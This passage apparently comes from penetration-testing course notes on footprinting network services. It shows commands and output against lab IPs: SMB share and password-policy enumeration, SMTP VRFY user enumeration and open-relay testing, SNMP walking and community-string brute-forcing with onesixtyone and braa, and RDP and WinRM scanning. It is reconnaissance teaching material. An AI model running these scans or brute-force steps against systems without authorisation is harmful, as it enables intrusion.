IPC\ndev:\n  comment: DEVenv\n  type: Disk\nhome:\n  comment: INFREIGHT Samba\n  type: Disk\nnotes:\n  comment: CheckIT\n  type: Disk\nprint$:\n  comment: Printer Drivers\n  type: Disk\n[*] Testing share IPC$\n[-] Could not check share: STATUS_OBJECT_NAME_NOT_FOUND\n[*] Testing share dev\n[-] Share doesn't exist\n[*] Testing share home\n[+] Mapping: OK, Listing: OK\n[*] Testing share notes\n[+] Mapping: OK, Listing: OK\n[*] Testing share print$\n[+] Mapping: DENIED, Listing: N/A\n\n ==========================================\n|    Policies via RPC for 10.129.14.128    |\n ==========================================\n[*] Trying port 445/tcp\n[+] Found policy:\ndomain_password_information:\n  pw_history_length: None\n  min_pw_length: 5\n  min_pw_age: none\n  max_pw_age: 49710 days 6 hours 21 minutes\n  pw_properties:\n  - DOMAIN_PASSWORD_COMPLEX: false\n  - DOMAIN_PASSWORD_NO_ANON_CHANGE: false\n  - DOMAIN_PASSWORD_NO_CLEAR_CHANGE: false\n  - DOMAIN_PASSWORD_LOCKOUT_ADMINS: false\n  - DOMAIN_PASSWORD_PASSWORD_STORE_CLEARTEXT: false\n  - DOMAIN_PASSWORD_REFUSE_PASSWORD_CHANGE: false\ndomain_lockout_information:\n  lockout_observation_window: 30 minutes\n  lockout_duration: 30 minutes\n  lockout_threshold: None\ndomain_logoff_information:\n  force_logoff_time: 49710 days 6 hours 21 minutes\n\n ==========================================\n|    Printers via RPC for 10.129.14.128    |\n ==========================================\n[+] No printers returned (this is not an error)\n\nCompleted after 0.61 seconds\n</code></pre></p> <p>Use more than two tools for enumeration. Because it can happen that due to the programming of the tools, we get different information that we have to check manually. Therefore, we should never rely only on automated tools where we do not know precisely how they were written.</p>","title":"Footprinting the Service"},{"location":"footprinting/smtp/","text":"<p>After sending his e-mail, the SMTP client, also known as <code>Mail User Agent</code> (<code>MUA</code>), converts it into a header and a body and uploads both to the SMTP server. This has a so-called <code>Mail Transfer Agent</code> (<code>MTA</code>), the software basis for sending and receiving e-mails. The MTA checks the e-mail for size and spam and then stores it. To relieve the MTA, it is occasionally preceded by a <code>Mail Submission Agent</code> (<code>MSA</code>), which checks the validity, i.e., the origin of the e-mail. This MSA is also called Relay server. The MTA then searches the DNS for the IP address of the recipient mail server.</p> <p>On arrival at the destination SMTP server, the data packets are reassembled to form a complete e-mail. From there, the <code>Mail delivery agent</code> (<code>MDA</code>) transfers it to the recipient's mailbox.</p>  <p>Client (<code>MUA</code>)  \u279e   Submission Agent (<code>MSA</code>)    \u279e   Open Relay (<code>MTA</code>)  \u279e   Mail Delivery Agent (<code>MDA</code>)     \u279e   Mailbox (<code>POP3</code>/<code>IMAP</code>)</p>  <p>To interact with the SMTP server, we can use the <code>telnet</code> tool to initialize a TCP connection with the SMTP server.</p> <pre><code>secops@kali[/kali]$ telnet 10.129.14.128 25\n\nTrying 10.129.14.128...\nConnected to 10.129.14.128.\nEscape character is '^]'.\n220 ESMTP Server \n\n\nHELO mail1.LEGALCORP.xyz\n\n250 mail1.LEGALCORP.xyz\n\n\nEHLO mail1\n\n250-mail1.LEGALCORP.xyz\n250-PIPELINING\n250-SIZE 10240000\n250-ETRN\n250-ENHANCEDSTATUSCODES\n250-8BITMIME\n250-DSN\n250-SMTPUTF8\n250 CHUNKING\n</code></pre> <p><code>VRFY</code> can be used to enumerate existing users on the system. <pre><code>secops@kali[/kali]$ telnet 10.129.14.128 25\n\nTrying 10.129.14.128...\nConnected to 10.129.14.128.\nEscape character is '^]'.\n220 ESMTP Server \n\nVRFY root\n\n252 2.0.0 root\n\n\nVRFY cryanight\n\n252 2.0.0 cryanight\n\n\nVRFY testuser\n\n252 2.0.0 testuser\n\n\nVRFY aaaaaaaaaaaaaaaaaaaaaaaaaaaa\n\n252 2.0.0 aaaaaaaaaaaaaaaaaaaaaaaaaaaa\n</code></pre></p>","title":"SMTP"},{"location":"footprinting/smtp/#footprinting-the-service","text":"<pre><code>secops@kali[/kali]$ sudo nmap 10.129.14.128 -sC -sV -p25\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2021-09-27 17:56 CEST\nNmap scan report for 10.129.14.128\nHost is up (0.00025s latency).\n\nPORT   STATE SERVICE VERSION\n25/tcp open  smtp    Postfix smtpd\n|_smtp-commands: mail1.LEGALCORP.xyz, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, \nMAC Address: 00:00:00:00:00:00 (VMware)\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 14.09 seconds\n</code></pre> <p>smtp-open-relay NSE script to identify the target SMTP server as an open relay using 16 different tests. <pre><code>secops@kali[/kali]$ sudo nmap 10.129.14.128 -p25 --script smtp-open-relay -v\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2021-09-30 02:29 CEST\nNSE: Loaded 1 scripts for scanning.\nNSE: Script Pre-scanning.\nInitiating NSE at 02:29\nCompleted NSE at 02:29, 0.00s elapsed\nInitiating ARP Ping Scan at 02:29\nScanning 10.129.14.128 [1 port]\nCompleted ARP Ping Scan at 02:29, 0.06s elapsed (1 total hosts)\nInitiating Parallel DNS resolution of 1 host. at 02:29\nCompleted Parallel DNS resolution of 1 host. at 02:29, 0.03s elapsed\nInitiating SYN Stealth Scan at 02:29\nScanning 10.129.14.128 [1 port]\nDiscovered open port 25/tcp on 10.129.14.128\nCompleted SYN Stealth Scan at 02:29, 0.06s elapsed (1 total ports)\nNSE: Script scanning 10.129.14.128.\nInitiating NSE at 02:29\nCompleted NSE at 02:29, 0.07s elapsed\nNmap scan report for 10.129.14.128\nHost is up (0.00020s latency).\n\nPORT   STATE SERVICE\n25/tcp open  smtp\n| smtp-open-relay: Server is an open relay (16/16 tests)\n|  MAIL FROM:&lt;&gt; -&gt; RCPT TO:&lt;relaytest@nmap.scanme.org&gt;\n|  MAIL FROM:&lt;antispam@nmap.scanme.org&gt; -&gt; RCPT TO:&lt;relaytest@nmap.scanme.org&gt;\n|  MAIL FROM:&lt;antispam@ESMTP&gt; -&gt; RCPT TO:&lt;relaytest@nmap.scanme.org&gt;\n|  MAIL FROM:&lt;antispam@[10.129.14.128]&gt; -&gt; RCPT TO:&lt;relaytest@nmap.scanme.org&gt;\n|  MAIL FROM:&lt;antispam@[10.129.14.128]&gt; -&gt; RCPT TO:&lt;relaytest%nmap.scanme.org@[10.129.14.128]&gt;\n|  MAIL FROM:&lt;antispam@[10.129.14.128]&gt; -&gt; RCPT TO:&lt;relaytest%nmap.scanme.org@ESMTP&gt;\n|  MAIL FROM:&lt;antispam@[10.129.14.128]&gt; -&gt; RCPT TO:&lt;\"relaytest@nmap.scanme.org\"&gt;\n|  MAIL FROM:&lt;antispam@[10.129.14.128]&gt; -&gt; RCPT TO:&lt;\"relaytest%nmap.scanme.org\"&gt;\n|  MAIL FROM:&lt;antispam@[10.129.14.128]&gt; -&gt; RCPT TO:&lt;relaytest@nmap.scanme.org@[10.129.14.128]&gt;\n|  MAIL FROM:&lt;antispam@[10.129.14.128]&gt; -&gt; RCPT TO:&lt;\"relaytest@nmap.scanme.org\"@[10.129.14.128]&gt;\n|  MAIL FROM:&lt;antispam@[10.129.14.128]&gt; -&gt; RCPT TO:&lt;relaytest@nmap.scanme.org@ESMTP&gt;\n|  MAIL FROM:&lt;antispam@[10.129.14.128]&gt; -&gt; RCPT TO:&lt;@[10.129.14.128]:relaytest@nmap.scanme.org&gt;\n|  MAIL FROM:&lt;antispam@[10.129.14.128]&gt; -&gt; RCPT TO:&lt;@ESMTP:relaytest@nmap.scanme.org&gt;\n|  MAIL FROM:&lt;antispam@[10.129.14.128]&gt; -&gt; RCPT TO:&lt;nmap.scanme.org!relaytest&gt;\n|  MAIL FROM:&lt;antispam@[10.129.14.128]&gt; -&gt; RCPT TO:&lt;nmap.scanme.org!relaytest@[10.129.14.128]&gt;\n|_ MAIL FROM:&lt;antispam@[10.129.14.128]&gt; -&gt; RCPT TO:&lt;nmap.scanme.org!relaytest@ESMTP&gt;\nMAC Address: 00:00:00:00:00:00 (VMware)\n\nNSE: Script Post-scanning.\nInitiating NSE at 02:29\nCompleted NSE at 02:29, 0.00s elapsed\nRead data files from: /usr/bin/../share/nmap\nNmap done: 1 IP address (1 host up) scanned in 0.48 seconds\n           Raw packets sent: 2 (72B) | Rcvd: 2 (72B)\n</code></pre></p>","title":"Footprinting the Service"},{"location":"footprinting/snmp/","text":"<p><code>Simple Network Management Protocol</code> SNMP was created to monitor network devices. In addition, this protocol can also be used to handle configuration tasks and change settings remotely. SNMP-enabled hardware includes routers, switches, servers, IoT devices, and many other devices that can also be queried and controlled using this standard protocol.</p> <p>In addition to the pure exchange of information, SNMP also transmits control commands using agents over UDP port <code>161</code>. The client can set specific values in the device and change options and settings with these commands.</p> <p>SNMP also enables the use of so-called traps over UDP port <code>162</code>. These are data packets sent from the SNMP server to the client without being explicitly requested. If a device is configured accordingly, an SNMP trap is sent to the client once a specific event occurs on the server-side.</p> <p>MIB To ensure that SNMP access works across manufacturers and with different client-server combinations, the Management Information Base (MIB) was created.</p> <p>OID An OID represents a node in a hierarchical namespace. A sequence of numbers uniquely identifies each node, allowing the node's position in the tree to be determined. The longer the chain, the more specific the information.</p> <p>SNMPv3 The security has been increased enormously for <code>SNMPv3</code> by security features such as username and password and transmission encryption (via <code>pre-shared key</code>) of the data.</p> <p>Community Strings Community strings can be seen as passwords that are used to determine whether the requested information can be viewed or not. It is important to note that many organizations are still using SNMPv2, as the transition to SNMPv3 can be very complex, but the services still need to remain active.</p>","title":"SNMP"},{"location":"footprinting/snmp/#footprinting-the-service","text":"<p>We can use tools like <code>snmpwalk</code>, <code>onesixtyone</code>, and <code>braa</code>. <code>Snmpwalk</code> is used to query the OIDs with their information. <code>Onesixtyone</code> can be used to brute-force the names of the community strings since they can be named arbitrarily by the administrator.</p> <p>SNMPwalk <pre><code>secops@kali[/kali]$ snmpwalk -v2c -c public 10.129.14.128\n\niso.3.6.1.2.1.1.1.0 = STRING: \"Linux xyz 5.11.0-34-generic #36~20.04.1-Ubuntu SMP Fri Aug 27 08:06:32 UTC 2021 x86_64\"\niso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10\niso.3.6.1.2.1.1.3.0 = Timeticks: (5134) 0:00:51.34\niso.3.6.1.2.1.1.4.0 = STRING: \"mrb0b@LEGALCORP.xyz\"\niso.3.6.1.2.1.1.5.0 = STRING: \"xyz\"\niso.3.6.1.2.1.1.6.0 = STRING: \"Sitting on the Dock of the Bay\"\niso.3.6.1.2.1.1.7.0 = INTEGER: 72\niso.3.6.1.2.1.1.8.0 = Timeticks: (0) 0:00:00.00\niso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1\niso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1\niso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1\niso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1\niso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1\niso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49\niso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.4\niso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.50\niso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3\niso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92\niso.3.6.1.2.1.1.9.1.3.1 = STRING: \"The SNMP Management Architecture MIB.\"\niso.3.6.1.2.1.1.9.1.3.2 = STRING: \"The MIB for Message Processing and Dispatching.\"\niso.3.6.1.2.1.1.9.1.3.3 = STRING: \"The management information definitions for the SNMP User-based Security Model.\"\niso.3.6.1.2.1.1.9.1.3.4 = STRING: \"The MIB module for SNMPv2 entities\"\niso.3.6.1.2.1.1.9.1.3.5 = STRING: \"View-based Access Control Model for SNMP.\"\niso.3.6.1.2.1.1.9.1.3.6 = STRING: \"The MIB module for managing TCP implementations\"\niso.3.6.1.2.1.1.9.1.3.7 = STRING: \"The MIB module for managing IP and ICMP implementations\"\niso.3.6.1.2.1.1.9.1.3.8 = STRING: \"The MIB module for managing UDP implementations\"\niso.3.6.1.2.1.1.9.1.3.9 = STRING: \"The MIB modules for managing SNMP Notification, plus filtering.\"\niso.3.6.1.2.1.1.9.1.3.10 = STRING: \"The MIB module for logging SNMP Notifications.\"\niso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (0) 0:00:00.00\niso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (0) 0:00:00.00\niso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (0) 0:00:00.00\niso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (0) 0:00:00.00\niso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (0) 0:00:00.00\niso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (0) 0:00:00.00\niso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (0) 0:00:00.00\niso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (0) 0:00:00.00\niso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (0) 0:00:00.00\niso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (0) 0:00:00.00\niso.3.6.1.2.1.25.1.1.0 = Timeticks: (3676678) 10:12:46.78\niso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 E5 09 14 0E 2B 2D 00 2B 02 00 \niso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216\niso.3.6.1.2.1.25.1.4.0 = STRING: \"BOOT_IMAGE=/boot/vmlinuz-5.11.0-34-generic root=UUID=9a6a5c52-f92a-42ea-8ddf-940d7e0f4223 ro quiet splash\"\niso.3.6.1.2.1.25.1.5.0 = Gauge32: 3\niso.3.6.1.2.1.25.1.6.0 = Gauge32: 411\niso.3.6.1.2.1.25.1.7.0 = INTEGER: 0\niso.3.6.1.2.1.25.1.7.0 = No more variables left in this MIB View (It is past the end of the MIB tree)\n\n...SNIP...\n\niso.3.6.1.2.1.25.6.3.1.2.1232 = STRING: \"printer-driver-sag-gdi_0.1-7_all\"\niso.3.6.1.2.1.25.6.3.1.2.1233 = STRING: \"printer-driver-splix_2.0.0+svn315-7fakesync1build1_amd64\"\niso.3.6.1.2.1.25.6.3.1.2.1234 = STRING: \"procps_2:3.3.16-1ubuntu2.3_amd64\"\niso.3.6.1.2.1.25.6.3.1.2.1235 = STRING: \"proftpd-basic_1.3.6c-2_amd64\"\niso.3.6.1.2.1.25.6.3.1.2.1236 = STRING: \"proftpd-doc_1.3.6c-2_all\"\niso.3.6.1.2.1.25.6.3.1.2.1237 = STRING: \"psmisc_23.3-1_amd64\"\niso.3.6.1.2.1.25.6.3.1.2.1238 = STRING: \"publicsuffix_20200303.0012-1_all\"\niso.3.6.1.2.1.25.6.3.1.2.1239 = STRING: \"pulseaudio_1:13.99.1-1ubuntu3.12_amd64\"\niso.3.6.1.2.1.25.6.3.1.2.1240 = STRING: \"pulseaudio-module-bluetooth_1:13.99.1-1ubuntu3.12_amd64\"\niso.3.6.1.2.1.25.6.3.1.2.1241 = STRING: \"pulseaudio-utils_1:13.99.1-1ubuntu3.12_amd64\"\niso.3.6.1.2.1.25.6.3.1.2.1242 = STRING: \"python-apt-common_2.0.0ubuntu0.20.04.6_all\"\niso.3.6.1.2.1.25.6.3.1.2.1243 = STRING: \"python3_3.8.2-0ubuntu2_amd64\"\niso.3.6.1.2.1.25.6.3.1.2.1244 = STRING: \"python3-acme_1.1.0-1_all\"\niso.3.6.1.2.1.25.6.3.1.2.1245 = STRING: \"python3-apport_2.20.11-0ubuntu27.21_all\"\niso.3.6.1.2.1.25.6.3.1.2.1246 = STRING: \"python3-apt_2.0.0ubuntu0.20.04.6_amd64\" \n\n...SNIP...\n</code></pre></p> <p>In the case of a misconfiguration, we would get approximately the same results from <code>snmpwalk</code> as just shown above. Once we know the community string and the SNMP service that does not require authentication (versions 1, 2c), we can query internal system information</p> <p>OneSixtyOne <pre><code>secops@kali[/kali]$ sudo apt install onesixtyone\nsecops@kali[/kali]$ onesixtyone -c /opt/useful/SecLists/Discovery/SNMP/snmp.txt 10.129.14.128\n\nScanning 1 hosts, 3220 communities\n10.129.14.128 [public] Linux xyz 5.11.0-37-generic #41~20.04.2-Ubuntu SMP Fri Sep 24 09:06:38 UTC 2021 x86_64\n</code></pre></p> <p>Often, when certain community strings are bound to specific IP addresses, they are named with the hostname of the host, and sometimes even symbols are added to these names to make them more challenging to identify. However, if we imagine an extensive network with over 100 different servers managed using SNMP, the labels, in that case, will have some pattern to them.</p> <p>Once we know a community string, we can use it with braa to brute-force the individual OIDs and enumerate the information behind them.</p> <pre><code>secops@kali[/kali]$ sudo apt install braa\nsecops@kali[/kali]$ braa &lt;community string&gt;@&lt;IP&gt;:.1.3.6.*   # Syntax\nsecops@kali[/kali]$ braa public@10.129.14.128:.1.3.6.*\n\n10.129.14.128:20ms:.1.3.6.1.2.1.1.1.0:Linux xyz 5.11.0-34-generic #36~20.04.1-Ubuntu SMP Fri Aug 27 08:06:32 UTC 2021 x86_64\n10.129.14.128:20ms:.1.3.6.1.2.1.1.2.0:.1.3.6.1.4.1.8072.3.2.10\n10.129.14.128:20ms:.1.3.6.1.2.1.1.3.0:548\n10.129.14.128:20ms:.1.3.6.1.2.1.1.4.0:mrb0b@LEGALCORP.xyz\n10.129.14.128:20ms:.1.3.6.1.2.1.1.5.0:xyz\n10.129.14.128:20ms:.1.3.6.1.2.1.1.6.0:US\n10.129.14.128:20ms:.1.3.6.1.2.1.1.7.0:78\n...SNIP...\n</code></pre>","title":"Footprinting the Service"},{"location":"footprinting/windows_remote_management_protocol/","text":"<p>The Remote Desktop Protocol (<code>RDP</code>) is a protocol developed by Microsoft for remote access to a computer running the Windows operating system. This protocol allows display and control commands to be transmitted via the GUI encrypted over IP networks. RDP works at the application layer in the TCP/IP reference model, typically utilizing TCP port 3389 as the transport protocol. However, the connectionless UDP protocol can use port 3389 also for remote administration.</p> <p>For an RDP session to be established, both the network firewall and the firewall on the server must allow connections from the outside. If Network Address Translation (<code>NAT</code>) is used on the route between client and server, as is often the case with Internet connections, the remote computer needs the public IP address to reach the server. In addition, port forwarding must be set up on the NAT router in the direction of the server.</p>","title":"RDP"},{"location":"footprinting/windows_remote_management_protocol/#footprinting-the-service","text":"<p>Scanning the RDP service can quickly give us a lot of information about the host. For example, we can determine if NLA is enabled on the server or not, the product version, and the hostname.</p> <pre><code>secops@kali[/kali]$ nmap -sV -sC 10.129.201.248 -p3389 --script rdp*\n\nStarting Nmap 7.92 ( https://nmap.org ) at 2021-11-06 15:45 CET\nNmap scan report for 10.129.201.248\nHost is up (0.036s latency).\n\nPORT     STATE SERVICE       VERSION\n3389/tcp open  ms-wbt-server Microsoft Terminal Services\n| rdp-enum-encryption: \n|   Security layer\n|     CredSSP (NLA): SUCCESS\n|     CredSSP with Early User Auth: SUCCESS\n|_    RDSTLS: SUCCESS\n| rdp-ntlm-info: \n|   Target_Name: ILF-SQL-01\n|   NetBIOS_Domain_Name: ILF-SQL-01\n|   NetBIOS_Computer_Name: ILF-SQL-01\n|   DNS_Domain_Name: ILF-SQL-01\n|   DNS_Computer_Name: ILF-SQL-01\n|   Product_Version: 10.0.17763\n|_  System_Time: 2021-11-06T13:46:00+00:00\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 8.26 seconds\n</code></pre> <p>In addition, we can use <code>--packet-trace</code> to track the individual packages and inspect their contents manually. We can see that the <code>RDP cookies</code> (<code>mstshash=nmap</code>) used by Nmap to interact with the RDP server can be identified by <code>threat hunters</code> and various security services such as Endpoint Detection and Response (<code>EDR</code>), and can lock us out as penetration testers on hardened networks.</p> <pre><code>secops@kali[/kali]$ nmap -sV -sC 10.129.201.248 -p3389 --packet-trace --disable-arp-ping -n\n\nStarting Nmap 7.92 ( https://nmap.org ) at 2021-11-06 16:23 CET\nSENT (0.2506s) ICMP [10.10.14.20 &gt; 10.129.201.248 Echo request (type=8/code=0) id=8338 seq=0] IP [ttl=53 id=5122 iplen=28 ]\nSENT (0.2507s) TCP 10.10.14.20:55516 &gt; 10.129.201.248:443 S ttl=42 id=24195 iplen=44  seq=1926233369 win=1024 &lt;mss 1460&gt;\nSENT (0.2507s) TCP 10.10.14.20:55516 &gt; 10.129.201.248:80 A ttl=55 id=50395 iplen=40  seq=0 win=1024\nSENT (0.2517s) ICMP [10.10.14.20 &gt; 10.129.201.248 Timestamp request (type=13/code=0) id=8247 seq=0 orig=0 recv=0 trans=0] IP [ttl=38 id=62695 iplen=40 ]\nRCVD (0.2814s) ICMP [10.129.201.248 &gt; 10.10.14.20 Echo reply (type=0/code=0) id=8338 seq=0] IP [ttl=127 id=38158 iplen=28 ]\nSENT (0.3264s) TCP 10.10.14.20:55772 &gt; 10.129.201.248:3389 S ttl=56 id=274 iplen=44  seq=2635590698 win=1024 &lt;mss 1460&gt;\nRCVD (0.3565s) TCP 10.129.201.248:3389 &gt; 10.10.14.20:55772 SA ttl=127 id=38162 iplen=44  seq=3526777417 win=64000 &lt;mss 1357&gt;\nNSOCK INFO [0.4500s] nsock_iod_new2(): nsock_iod_new (IOD #1)\nNSOCK INFO [0.4500s] nsock_connect_tcp(): TCP connection requested to 10.129.201.248:3389 (IOD #1) EID 8\nNSOCK INFO [0.4820s] nsock_trace_handler_callback(): Callback: CONNECT SUCCESS for EID 8 [10.129.201.248:3389]\nService scan sending probe NULL to 10.129.201.248:3389 (tcp)\nNSOCK INFO [0.4830s] nsock_read(): Read request from IOD #1 [10.129.201.248:3389] (timeout: 6000ms) EID 18\nNSOCK INFO [6.4880s] nsock_trace_handler_callback(): Callback: READ TIMEOUT for EID 18 [10.129.201.248:3389]\nService scan sending probe TerminalServerCookie to 10.129.201.248:3389 (tcp)\nNSOCK INFO [6.4880s] nsock_write(): Write request for 42 bytes to IOD #1 EID 27 [10.129.201.248:3389]\nNSOCK INFO [6.4880s] nsock_read(): Read request from IOD #1 [10.129.201.248:3389] (timeout: 5000ms) EID 34\nNSOCK INFO [6.4880s] nsock_trace_handler_callback(): Callback: WRITE SUCCESS for EID 27 [10.129.201.248:3389]\nNSOCK INFO [6.5240s] nsock_trace_handler_callback(): Callback: READ SUCCESS for EID 34 [10.129.201.248:3389] (19 bytes): .........4.........\nService scan match (Probe TerminalServerCookie matched with TerminalServerCookie line 13640): 10.129.201.248:3389 is ms-wbt-server.  Version: |Microsoft Terminal Services|||\n\n...SNIP...\n\nNSOCK INFO [6.5610s] nsock_write(): Write request for 54 bytes to IOD #1 EID 27 [10.129.201.248:3389]\nNSE: TCP 10.10.14.20:36630 &gt; 10.129.201.248:3389 | 00000000: 03 00 00 2a 25 e0 00 00 00 00 00 43 6f 6f 6b 69    *%      Cooki\n00000010: 65 3a 20 6d 73 74 73 68 61 73 68 3d 6e 6d 61 70 e: mstshash=nmap\n00000020: 0d 0a 01 00 08 00 0b 00 00 00  \n\n...SNIP...\n\nNSOCK INFO [6.6820s] nsock_write(): Write request for 57 bytes to IOD #2 EID 67 [10.129.201.248:3389]\nNSOCK INFO [6.6820s] nsock_trace_handler_callback(): Callback: WRITE SUCCESS for EID 67 [10.129.201.248:3389]\nNSE: TCP 10.10.14.20:36630 &gt; 10.129.201.248:3389 | SEND\nNSOCK INFO [6.6820s] nsock_read(): Read request from IOD #2 [10.129.201.248:3389] (timeout: 5000ms) EID 74\nNSOCK INFO [6.7180s] nsock_trace_handler_callback(): Callback: READ SUCCESS for EID 74 [10.129.201.248:3389] (211 bytes)\nNSE: TCP 10.10.14.20:36630 &lt; 10.129.201.248:3389 | \n00000000: 30 81 d0 a0 03 02 01 06 a1 81 c8 30 81 c5 30 81 0          0  0\n00000010: c2 a0 81 bf 04 81 bc 4e 54 4c 4d 53 53 50 00 02        NTLMSSP\n00000020: 00 00 00 14 00 14 00 38 00 00 00 35 82 8a e2 b9        8   5\n00000030: 73 b0 b3 91 9f 1b 0d 00 00 00 00 00 00 00 00 70 s              p\n00000040: 00 70 00 4c 00 00 00 0a 00 63 45 00 00 00 0f 49  p L     cE    I\n00000050: 00 4c 00 46 00 2d 00 53 00 51 00 4c 00 2d 00 30  L F - S Q L - 0\n00000060: 00 31 00 02 00 14 00 49 00 4c 00 46 00 2d 00 53  1     I L F - S\n00000070: 00 51 00 4c 00 2d 00 30 00 31 00 01 00 14 00 49  Q L - 0 1     I\n00000080: 00 4c 00 46 00 2d 00 53 00 51 00 4c 00 2d 00 30  L F - S Q L - 0\n00000090: 00 31 00 04 00 14 00 49 00 4c 00 46 00 2d 00 53  1     I L F - S\n000000a0: 00 51 00 4c 00 2d 00 30 00 31 00 03 00 14 00 49  Q L - 0 1     I\n000000b0: 00 4c 00 46 00 2d 00 53 00 51 00 4c 00 2d 00 30  L F - S Q L - 0\n000000c0: 00 31 00 07 00 08 00 1d b3 e8 f2 19 d3 d7 01 00  1\n000000d0: 00 00 00\n\n...SNIP...\n</code></pre> <p>A Perl script named rdp-sec-check.pl has also been developed by Cisco CX Security Labs that can unauthentically identify the security settings of RDP servers based on the handshakes.</p> <p>RDP Security Check - Installation <pre><code>secops@kali[/kali]$ sudo cpan\n\nLoading internal logger. Log::Log4perl recommended for better logging\n\nCPAN.pm requires configuration, but most of it can be done automatically.\nIf you answer 'no' below, you will enter an interactive dialog for each\nconfiguration option instead.\n\nWould you like to configure as much as possible automatically? [yes] yes\n\n\nAutoconfiguration complete.\n\ncommit: wrote '/root/.cpan/CPAN/MyConfig.pm'\n\nYou can re-run configuration any time with 'o conf init' in the CPAN shell\n\ncpan shell -- CPAN exploration and modules installation (v2.27)\nEnter 'h' for help.\n\n\ncpan[1]&gt; install Encoding::BER\n\nFetching with LWP:\nhttp://www.cpan.org/authors/01mailrc.txt.gz\nReading '/root/.cpan/sources/authors/01mailrc.txt.gz'\n............................................................................DONE\n...SNIP...\n</code></pre></p> <p>RDP Security Check <pre><code>secops@kali[/kali]$ git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git &amp;&amp; cd rdp-sec-check\nsecops@kali[/kali]$ ./rdp-sec-check.pl 10.129.201.248\n\nStarting rdp-sec-check v0.9-beta ( http://labs.portcullis.co.uk/application/rdp-sec-check/ ) at Sun Nov  7 16:50:32 2021\n\n[+] Scanning 1 hosts\n\nTarget:    10.129.201.248\nIP:        10.129.201.248\nPort:      3389\n\n[+] Checking supported protocols\n\n[-] Checking if RDP Security (PROTOCOL_RDP) is supported...Not supported - HYBRID_REQUIRED_BY_SERVER\n[-] Checking if TLS Security (PROTOCOL_SSL) is supported...Not supported - HYBRID_REQUIRED_BY_SERVER\n[-] Checking if CredSSP Security (PROTOCOL_HYBRID) is supported [uses NLA]...Supported\n\n[+] Checking RDP Security Layer\n\n[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_NONE...Not supported\n[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_40BIT...Not supported\n[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_128BIT...Not supported\n[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_56BIT...Not supported\n[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_FIPS...Not supported\n\n[+] Summary of protocol support\n\n[-] 10.129.201.248:3389 supports PROTOCOL_SSL   : FALSE\n[-] 10.129.201.248:3389 supports PROTOCOL_HYBRID: TRUE\n[-] 10.129.201.248:3389 supports PROTOCOL_RDP   : FALSE\n\n[+] Summary of RDP encryption support\n\n[-] 10.129.201.248:3389 supports ENCRYPTION_METHOD_NONE   : FALSE\n[-] 10.129.201.248:3389 supports ENCRYPTION_METHOD_40BIT  : FALSE\n[-] 10.129.201.248:3389 supports ENCRYPTION_METHOD_128BIT : FALSE\n[-] 10.129.201.248:3389 supports ENCRYPTION_METHOD_56BIT  : FALSE\n[-] 10.129.201.248:3389 supports ENCRYPTION_METHOD_FIPS   : FALSE\n\n[+] Summary of security issues\n\n\nrdp-sec-check v0.9-beta completed at Sun Nov  7 16:50:33 2021\n</code></pre></p>","title":"Footprinting the Service"},{"location":"footprinting/windows_remote_management_protocol/#winrm","text":"<p>The Windows Remote Management (<code>WinRM</code>) is a simple Windows integrated remote management protocol based on the command line. WinRM uses the Simple Object Access Protocol (<code>SOAP</code>) to establish connections to remote hosts and their applications. Therefore, WinRM must be explicitly enabled and configured starting with Windows 10. WinRM relies on <code>TCP</code> ports <code>5985</code> and <code>5986</code> for communication, with the last port <code>5986 using HTTPS</code>, as ports 80 and 443 were previously used for this task.</p>","title":"WinRM"},{"location":"footprinting/windows_remote_management_protocol/#footprinting-the-service_1","text":"<p>We will see that only HTTP (<code>TCP 5985</code>) is used instead of HTTPS (<code>TCP 5986</code>).</p> <pre><code>rmns@xyz[/xyz]$ nmap -sV -sC 10.129.201.248 -p5985,5986 --disable-arp-ping -n\n\nStarting Nmap 7.92 ( https://nmap.org ) at 2021-11-06 16:31 CET\nNmap scan report for 10.129.201.248\nHost is up (0.030s latency).\n\nPORT     STATE SERVICE VERSION\n5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 7.34 seconds\n</code></pre> <p>If we want to find out whether one or more remote servers 